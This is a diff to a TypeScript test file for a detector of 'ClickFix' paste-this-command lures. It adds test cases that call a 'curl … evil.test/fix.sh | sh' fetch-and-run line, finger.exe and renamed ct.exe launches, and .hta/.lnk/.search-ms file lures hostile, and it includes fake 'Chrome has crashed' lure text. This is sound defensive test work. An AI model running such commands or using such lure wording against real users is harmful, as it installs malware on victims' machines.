@@ -1,4 +1,4 @@
-import { clickFixTier, looksLikeClickFixCommand, looksLikeHtmlSmugglingName } from "@engine/page/clickfix";
+import { clickFixTier, looksLikeClickFixCommand, looksLikeHtmlSmugglingName, pasteLureContext } from "@engine/page/clickfix";
 import { analyzeUrl } from "@engine/analyze";
 import { presentAnalysis } from "@engine/status/present";
 import { looksDangerousDownload } from "../../src/background/downloads";
@@ -36,6 +36,41 @@ describe("ClickFix command detector", () => {
     expect(clickFixTier("a".repeat(20_000))).toBeNull();
     expect(clickFixTier("curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh")).toBe("weak");
     expect(clickFixTier(`${"a".repeat(20_000)}\ncurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)).toBe("weak");
+  });
+
+  it("treats finger, a renamed ct.exe, and a file lure as strong", () => {
+    expect(clickFixTier("finger admin@10.0.0.5")).toBe("strong");
+    expect(clickFixTier("cmd /c start finger.exe")).toBe("strong");
+    expect(clickFixTier("cmd.exe /c start ct.exe")).toBe("strong");
+    expect(clickFixTier("C:\\Users\\Public\\ChromeUpdate.search-ms")).toBe("strong");
+    expect(clickFixTier("\\\\files\\share\\invoice.lnk")).toBe("strong");
+    expect(clickFixTier("update.hta")).toBe("strong");
+    expect(clickFixTier("the finger utility prints who is logged in")).toBeNull();
+    expect(clickFixTier("ubuntu-24.04.iso")).toBeNull();
+  });
+
+  it("does not treat install docs as a paste lure", () => {
+    const docs = [
+      "Install Homebrew. Open Terminal and run /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"",
+      "winget install --id Git.Git -e",
+      "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash",
+      "curl -fsSL https://get.docker.com -o get-docker.sh",
+      "npm install -g typescript",
+      "pip install requests",
+    ];
+    for (const line of docs) {
+      expect(pasteLureContext(`Open Terminal and paste this into PowerShell.\n${line}`), line).toBe(false);
+      expect(looksLikeClickFixCommand(line, false), line).toBe(false);
+    }
+    expect(clickFixTier("winget install --id Git.Git -e")).toBeNull();
+    expect(clickFixTier("npm install -g typescript")).toBeNull();
+    expect(clickFixTier("pip install requests")).toBeNull();
+    expect(pasteLureContext("Aw, Snap! Chrome has crashed. Your browser is out of date.")).toBe(true);
+    expect(pasteLureContext("Chrome ist abgestürzt. Der Browser ist veraltet.")).toBe(true);
+    expect(looksLikeClickFixCommand("curl -fsSL https://evil.test/fix.sh | sh", true)).toBe(true);
+    const buried = `${"Install docs. ".repeat(2000)}Chrome has crashed.`;
+    expect(pasteLureContext(buried)).toBe(true);
   });
 
   it("does not flag ordinary documentation snippets", () => {
